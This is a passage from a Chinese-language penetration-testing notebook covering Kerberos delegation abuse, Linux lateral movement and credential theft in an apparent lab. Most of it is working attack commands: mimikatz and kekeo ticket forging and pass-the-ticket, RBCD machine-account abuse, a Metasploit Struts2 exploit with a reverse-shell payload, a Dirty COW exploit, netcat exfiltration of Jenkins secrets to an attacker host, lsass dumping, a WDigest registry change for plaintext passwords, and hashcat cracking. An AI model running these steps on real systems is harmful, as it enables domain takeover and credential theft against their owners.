class="line"><span class="meta prompt_"># </span><span class="language-bash">破解密文 https://github.com/hashcat/hashcat/</span></span><br><span class="line">hashcat -m 5600 hash pass.txt --show</span><br></pre></td></tr></table></figure>
<h4 id="委派攻击分类"><a class="markdownIt-Anchor" href="#委派攻击分类">#</a> 委派攻击分类</h4>
<p>参考链接：<span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTE1NTU=">https://xz.aliyun.com/t/11555</span></p>
<p>（ 1 ）非约束性委派 - 没有限制</p>
<p>a. 非约束委派原理：<br>
机器 A (域控) 访问具有非约束委派权限的机器 B 的服务，会把当前认证用户 (域管用户) 的的 TGT 放在 ST 票据中，一起发送给机器 B，机器 B 会把 TGT 存储在 lsass 进程中以备下次重用。从而机器 B 就能使用这个 TGT 模拟认 证用户 (域管用户) 访问服务。</p>
<p>b. 利用场景：<br>
攻击者拿到了一台配置非约束委派的机器权限，可以诱导域管来访问该机器，然后得到管理员的 TGT，从而模拟域管用户。</p>
<p>c. 总结<br>
首先判断委派的第三个设置，然后看针对用户，主动攻击。</p>
<p>（ 2 ）约束性委派 - 有限制</p>
<p>a. 约束委派原理：<br>
由于非约束委派的不安全性，微软在 windows server 2003 中引入了约束委<br>
派，对 Kerberos 协议进行了拓展，引入了 SService for User to Self (S4U2Self) 和 Service for User to Proxy (S4U2proxy)。</p>
<p>b. 利用场景：<br>
如果攻击者控制了服务 A 的账号，并且服务 A 配置了到域控的 CIFS 服务的约束性委派。则攻击者可以先使用 S4u2seflt 申请域管用户（administrator）访问 A 服务的 ST1，然后使用 S4u2Proxy 以 administrator 身份访问域控的 CIFS 服务，即相当于控制了域控。</p>
<p>c. 总结<br>
首先判断委派的第二个设置，然后看针对用户，后续钓鱼配合</p>
<p>（ 3 ）基于资源的约束性委派 - 资源方面的限制</p>
<p>a. 资源约束委派原理（不需要委派的任何设置！）：<br>
基于资源的约束委派 (RBCD) 是在 Windows Server 2012 中新加入的功能，<br>
与传统的约束委派相比，它不再需要域管理员权限去设置相关属性。RBCD 把 设置委派的权限赋予了机器自身，既机器自己可以决定谁可以被委派来控制我。 也就是说机器自身可以直接在自己账户上配置 msDS-AllowedToActOnBehalfOfO therIdentity 属性来设置 RBCD。</p>
<p>b. 利用条件：<br>
域控 Windows2012 及以上、存在域内成员用户加入域操作</p>
<p>c. 总结<br>
只看 DC 是不是 2012 及以上帮版本，然后看针对用户，主动攻击。计算机加入域时，加入域的域用户被控后也将导致使用当前域用户加入的计算机受控。</p>
<h4 id="非约束委派"><a class="markdownIt-Anchor" href="#非约束委派">#</a> 非约束委派</h4>
<ul>
<li>复现配置</li>
</ul>
<p>域控配置机器的委派属性，信任此计算机来委派任何服务，并且在域控上执行 <code>setspn -U -A priv/test webadmin</code> ，于是 webadmin 有了委派权限。</p>
<ul>
<li>判断委派权限的服务账户和机器账户：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">a. 查询域内设置了非约束委派的服务账户：</span></span><br><span class="line">AdFind -b &quot;DC=god,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">b. 查询域内设置了非约束委派的机器账户:</span></span><br><span class="line">AdFind -b &quot;DC=god,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br></pre></td></tr></table></figure>
<ul>
<li>利用步骤：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">a. 域控与委派机器通讯</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">域控主动执行：</span></span><br><span class="line">net use \\webserver</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">钓鱼诱使域管访问：http://192.168.3.31/31.html</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;img src=&quot;file:///\\192.168.3.31\2&quot;&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">b. 导出票据到本地</span></span><br><span class="line">mimikatz sekurlsa::tickets /export</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">c. 导入票据到内存</span></span><br><span class="line">mimikatz kerberos::ptt [0;fece8]- 2 - 0 - 60a00000-Administrator@krbtgt-GOD.ORG.kirbi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">d. 连接通讯域控</span> </span><br><span class="line">dir \\owa2010cn-god\c$</span><br></pre></td></tr></table></figure>
<h4 id="约束委派"><a class="markdownIt-Anchor" href="#约束委派">#</a> 约束委派</h4>
<ul>
<li>复现配置</li>
</ul>
<p>机器设置仅信任此计算机指定服务 - cifs、用户设置仅信任此计算机指定服务 - cifs</p>
<ul>
<li>判断查询</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">a. 查询机器用户配置约束委派</span></span><br><span class="line">AdFind -b &quot;DC=god,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">b. 查询服务账户配置约束委派</span></span><br><span class="line">AdFind -b &quot;DC=god,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
<ul>
<li>利用步骤：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">a. 获取用户的票据</span></span><br><span class="line">kekeo &quot;tgt::ask /user:webadmin /domain:god.org /password::admin!@#45 /ticket:administrator.kirbi&quot; &quot;exit&quot;</span><br><span class="line">kekeo &quot;tgt::ask /user:webadmin /domain:god.org /NTLM:518b98ad4178a53695dc997aa02d455c /ticket:administrator.kirbi&quot; &quot;exit&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">b. 利用用户票据获取域控票据</span></span><br><span class="line">kekeo &quot;tgs::s4u /tgt:TGT_webadmin@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi /user:Administrator@god.org /service:cifs/owa2010cn-god&quot; &quot;exit&quot;</span><br><span class="line">kekeo &quot;tgs::s4u /tgt:TGT_webadmin@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi /user:Administrator@god.org /service:cifs/owa2010cn-god.god.org&quot; &quot;exit&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">c. 导入票据到内存</span></span><br><span class="line">mimikatz kerberos::ptt TGS_Administrator@god.org@GOD.ORG_cifs~owa2010cn-god.god.org@GOD.ORG.kirbi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">d. 连接通讯域控</span></span><br><span class="line">shell dir \\owa2010cn-god.god.org\c$</span><br></pre></td></tr></table></figure>
<h4 id="资源约束委派"><a class="markdownIt-Anchor" href="#资源约束委派">#</a> 资源约束委派</h4>
<p>当多个计算机加入域时，可以使用同一域用户加入，如果有一台加入域的电脑被控，则其余使用该域用户加入域的主机都会被控。<br>
计算机脱域时，需要输入域控账户密码，并且重启。计算机加入域时，需要域控先添加域用户，计算机通过此域用户加入域控，并且重启。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取受害目标</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">有哪些域内计算机存在同一用户加入的</span></span><br><span class="line">AdFind.exe -h 192.168.3.33 -b &quot;DC=xiaodi,DC=local&quot; -f &quot;objectClass=computer&quot; mS-DS-CreatorSID</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看是否有相同sid值，有的话可以判断出有多用户使用该域用户加入了域</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">判断受害用户</span></span><br><span class="line">sid2user.exe \\192.168.3.3 5 21 1695257952 3088263962 2055235443 1104</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">普通域用户设置用户名密码，为域控增加机器</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">项目地址：https://github.com/Kevin-Robertson/Powermad</span></span><br><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">Import-Module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount serviceA -Password $(ConvertTo-SecureString &quot;123456&quot; -AsPlainText -Force)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取新加的计算器的sid：</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">工具地址：https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</span></span><br><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line">Get-NetComputer serviceA -Properties objectsid</span><br><span class="line">S-1-5-21-1695257952-3088263962-2055235443-1107</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置修改属性</span></span><br><span class="line">import-module .\powerview.ps1</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1695257 952-3088263962-2055235443-1107)&quot;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">SDBytes = New-Object byte[] (<span class="variable">$SD</span>.BinaryLength)</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">SD.GetBinaryForm(<span class="variable">$SDBytes</span>, 0)</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改原主机data用户的相关属性</span></span><br><span class="line">Get-DomainComputer DATA| Set-DomainObject -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">验证修改是否成功</span></span><br><span class="line">Get-DomainComputer DATA -Properties msds-allowedtoactonbehalfofotheridentity</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清除修改设置</span></span><br><span class="line">Set-DomainObject DATA -Clear &#x27;msds-allowedtoactonbehalfofotheridentity&#x27; -Verbose</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">建立代理连接目标获取票据：</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">需要修改本地hosts文件，将以下两个域名从本地hosts文件中解析</span></span><br><span class="line">python getST.py -dc-ip 192.168.3.33 xiaodi.local/serviceA\$:123456 -spn cifs/data.xiaodi.local -impersonate administrator</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">对票据进行操作</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导入票据到内存：</span></span><br><span class="line">mimikatz kerberos::ptc administrator.ccache</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">连接利用票据：</span></span><br><span class="line">dir \\data.xiaodi.local\c$</span><br><span class="line">python psexec.py -k xiaodi.local/administrator@data.xiaodi.local -no-pass</span><br></pre></td></tr></table></figure>
<h4 id="横向linux"><a class="markdownIt-Anchor" href="#横向linux">#</a> 横向 linux</h4>
<p><img data-src="/N1h1l157/Safe/image-007.png" alt></p>
<p>（ 1 ）Web DMZ 权限获取</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">信息收集：</span></span><br><span class="line">nmap 172.16.250.0/24</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">根据确定的 80 上的opensms10.3搜索漏洞利用方法：/struts2-showcase</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用msf进行st 2 漏洞利用：</span></span><br><span class="line">use exploit/multi/http/struts2_content_type_ognl</span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">set rhosts 172.16.250.10</span><br><span class="line">set lport 80</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>（ 2 ）脏牛漏洞权限提升至 root（会把服务器打崩）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载exp</span></span><br><span class="line">curl https://raw.githubusercontent.com/sqlnetcat/dirtycow-mem/master/dirtycow-mem.c</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">msf</span></span><br><span class="line">upload /root/dirtycow-mem.c /tmp</span><br><span class="line">shell</span><br><span class="line">gcc -Wall -o dirtycow-mem dirtycow-mem.c -ldl -lpthread</span><br><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">./dirtycow-mem</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">稳定脏牛漏洞带来对系统的危害：</span></span><br><span class="line">echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/panic &amp;&amp; echo 1 &gt; /proc/sys/kernel/panic_on_oo</span><br><span class="line">ps &amp;&amp; echo 1 &gt; /proc/sys/kernel/panic_on_unrecovered_nmi &amp;&amp; echo 1 &gt; /proc/sys/kernel/panic_on_io_nmi &amp;&amp; echo 1 &gt; /proc/sys/kernel/panic_on_warn</span><br></pre></td></tr></table></figure>
<p>（ 3 ）linux 信息收集：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">找到敏感文件</span></span><br><span class="line">/opt/tomcat/webapps/kittens/WEB-INF/config/opencms.properties</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发现存在172.16.250.30 8080的网站，但只允许跳板机访问，可以用ssh做代理转发流量</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">找到ssh的私钥文件可以连接到jenkins机器，进行远程登录</span></span><br><span class="line">cat ~/.bash_history</span><br><span class="line">cp ~/.ssh/id_rsa /tmp/id_rsa</span><br><span class="line">chmod 777 id_rsa</span><br><span class="line">download /tmp/id_rsa /root/id_rsa</span><br><span class="line">chmod 0600 id_rsa</span><br><span class="line">ssh -i id_rsa root@172.16.250.30</span><br><span class="line">netstat - tunlp</span><br></pre></td></tr></table></figure>
<p>（ 4 ）msf 设置代理将端口转发</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">set</span></span></span><br><span class="line">use auxiliary/server/server/socks_proxy</span><br><span class="line">set srvport 2222</span><br><span class="line">run</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">conf</span></span><br><span class="line">jobs 查看当前工作是否正常</span><br><span class="line">vim /etc/proxychains4.conf</span><br><span class="line">dynamic_chain 只需保证一个代理正确即可使用</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">strict_chain 需保证每一个代理都准确</span></span><br></pre></td></tr></table></figure>
<p>（ 5 ）Jenkins DMZ 后台存储的密钥传输</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">本地用nc接受文件：</span></span><br><span class="line">nc -lvp 1234 &gt; master.key</span><br><span class="line">nc -lvp 1234 &gt; hudson.util.Secret</span><br><span class="line">nc -lvp 1234 &gt; credentials.xml</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">肉鸡用nc将文件反向传输出去：</span></span><br><span class="line">nc 172.16.250.128 1234 &lt; /home/jenkins/secrets/hudson.util.Secret</span><br><span class="line">nc 172.16.250.128 1234 &lt; /home/jenkins/secrets/master.key</span><br><span class="line">nc 172.16.250.128 1234 &lt; /home/jenkins/credentials.xml</span><br></pre></td></tr></table></figure>
<p>（ 6 ）破解密匙：<br>
项目地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NoZWV0ei9qZW5raW5zLWRlY3J5cHQ=">https://github.com/cheetz/jenkins-decrypt</span><br>
 <code>python decrypt.py master.key hudson.util.Secret credentials.xml</code></p>
<p>（ 7 ）Database DMZ 权限获取<br>
密码横向： <code>ssh db_backup@172.16.250.50</code> <br>
)uDvra{4UL^;r?*h<br>
 权限提升：getuid 及 sudo su</p>
<h4 id="密码获取"><a class="markdownIt-Anchor" href="#密码获取">#</a> 密码获取</h4>
<ul>
<li>Linux 密码获取及破解</li>
</ul>
<p>（ 1 ）密码读取 - 没啥用、适用版本少：<br>
项目地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2h1bnRlcmdyZWdhbC9taW1pcGVuZ3Vpbg==">https://github.com/huntergregal/mimipenguin</span><br>
 使用方法：sh <span class="exturl" data-url="aHR0cDovL21pbWlwZW5ndWluLnNo">mimipenguin.sh</span></p>
<p>（ 2 ）密码破解（SHA 512 居多）- 不容易破解：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">根据shadow获取root密码进行破解</span></span><br><span class="line">cat /etc/shadow</span><br><span class="line">hashcat.exe -a 3 -m 1800 linuxhash.txt pass.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">加密形式</span></span><br><span class="line">linux sha512crypt $6$, SHA512 (Unix)加密方式：hashcat -m 1800 sha512linux.txt p.txt</span><br><span class="line">linux sha256crypt $5$, SHA256 (Unix)加密方式：hashcat -m 7400 sha256linux.txt p.txt</span><br><span class="line">linux md5crypt, MD5 (Unix), Cisco-IOS$1$ (MD5)加密方式：hashcat -m 500 linuxmd5.txt p.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">linux下bcrypt <span class="variable">$2</span>*$, Blowfish加密方式：</span></span><br><span class="line">hashcat -m 3200 linuxmd5.txt p.txt</span><br></pre></td></tr></table></figure>
<ul>
<li>Windows 密码获取</li>
</ul>
<p>微软为了防止明文密码泄露发布了补丁 KB2871997，关闭了 Wdigest 功能。 当系统为 win10 或 2012R2 以上时，默认在内存缓存中禁止保存明文密码，Win dows-Mimikatz 会无法导出明文，此时可以通过修改注册表的方式抓取明文，但 需要用户重新登录后才能成功抓取。获取明文信息可以方便横向移动，可以有 更多的字典组合，明文要比 hash 要好用的多。</p>
<p>（ 1 ）在线读</p>
<p>工具地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dlbnRpbGtpd2kvbWltaWthdHo=">https://github.com/gentilkiwi/mimikatz</span><br>
`mimikatz.exe “privilege::debug” “log” “sekurlsa::logonpasswords”``</p>
<p>（ 2 ）离线读</p>
<p>链接：<span class="exturl" data-url="aHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL3poLWNuL3N5c2ludGVybmFscy9kb3dubG9hZHMvcHJvY2R1bXA=">https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump</span></p>
<p>在 2012server 后只能读取到 hash 而不能读取到明文密码，Procdump 是微软 官方的工具，可在命令行将 lsass 导出且杀软不会拦截，针对防护拦截 Mimikat z，用 procdump 将密码或 hash 转储到 lsass，在用本地的 mimikaztz 进行离线解析，或直接从从内存中将数据导出。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">转储 lsass</span></span><br><span class="line">Procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.DMP&quot;</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure>
<p>（ 3 ）解决高版本</p>
<p>修改注册表 + 强制锁屏 + 等待系统管理员重新登录 + 截取明文密码<br>
修改注册表来让 Wdigest Auth 保存明文口令方式<br>
 <code>shell reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\ /v UseLogonCredential /t REG_DWORD /d 1</code> <br>
 再次使用 mimikatz 时，将可以成功导出明文票据</p>
<p>（ 4 ）HASH 破解<br>
方法：hashcat 工具 cmd5、 somd5 在线网站</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hashcat使用方法如下：</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">字典破解</span></span><br><span class="line">.\hashcat.exe -a 0 -m 1000 .\hash.txt .\pass.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">暴力破解</span></span><br><span class="line">hashcat.exe -a 3 -m 1000 518b98ad4178a53695dc997aa02d455c?l?l?l?l?l?s?s?s?d?d</span><br><span class="line">-m 密文类型 </span><br><span class="line">-a 破解类型 ?l 小写 ?s 符号 ?d 数字</span><br></pre></td></tr></table></figure>
<p>（ 5 ）RDP 凭据抓取<br>
 mstsc 连接过其他机器，如果选择保存凭剧，则可以通过以下方式导出 rdp 密码。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看连接记录</span></span><br><span class="line">cmdkey /list</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找本地的Credentials</span></span><br><span class="line">dir /a %userprofile%\appdata\local\microsoft\credentials\*Credentials记录guidMasterKey值:</span><br><span class="line">mimikatz dpapi::cred /in:C:\Users\webadmin\appdata\ local\microsoft\credentials\5FBB2585F99BA05366F08E52F1C1740B</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">找到guidMasterKey对应的MasterKey:</span></span><br><span class="line">mimikatz sekurlsa::dpapi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">system权限解密指定的MasterKey凭据：</span></span><br><span class="line">mimikatz dpapi::cred /in:C:\Users\webadmin\appdata\local\microsoft\credential s\ 5FBB2585F99BA05366F08E52F1C1740B /masterkey:f70e1a641096f1b63731d571b43b33aaf009f6af5a3352504e6ddb3cd158f17eec2d541f18b8289ebf547d871dfb257a6bbbd5232550eb6f26a06d39378da4a5</span><br></pre></td></tr></table></figure>
<p><strong>凭据导出:<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1dhemVIZWxsL3NhbS10aGUtYWRtaW4=">https://github.com/WazeHell/sam-the-admin</span></strong><br>
<strong>python sam_the_admin.py test0/‘xiaodi:admin!@#45’ -dc-ip 192.168.10.20 -shell</strong></p>
<h4 id="父域子域"><a class="markdownIt-Anchor" href="#父域子域">#</a> 父域子域</h4>
<p><img data-src="/N1h1l157/Safe/image-008.png" alt></p>
<p>设置父子域的时候，先设置父域及其控制的两台域用户电脑。对三台电脑 分别配置 ip 地址，并解析到父域的 ip 上，修改三者的计算机名称。对父域的服 务器管理做设置，选择添加角色和功能向导，服务器角色配置中选择域服务， 完成之后将此计算机提升为域控，并添加新林，设定自定义域，netbios 名称等。</p>
<p>通过在父域上添加新的角色，并使普通计算机以域用户身份加入域即可加 入该父域。子域的设置时，需要在父域上先开启 DNS 的一个开关，然后将子域 按照父域的设置方式添加角色和功能向导，区别在于设置为域控方式为加入域 为现有林，林为父域的信息，并自定义相关内容之后即可成功设置为子域。</p>
<p>子域控制的计算机，其 dns 解析地址需要设置为子域控的 ip 地址。同父域 管辖的计算机一样，通过给子域管辖的计算机设置新的用户名供其登录。修改 子域控的 dns 解析，首选本身，备选为父域控。而后将最后一台电脑加入到子 域即可。</p>
<h4 id="局域网渗透"><a class="markdownIt-Anchor" href="#局域网渗透">#</a> 局域网渗透</h4>
<ul>
<li>单向欺骗和双向欺骗</li>
</ul>
<p>单向欺骗：攻击机伪造数据包后本应该传输给靶机的数据错误的传输给攻 击机，使靶机得不到服务器的响应数据，甚至根本无法将数据包发送出局域网。</p>
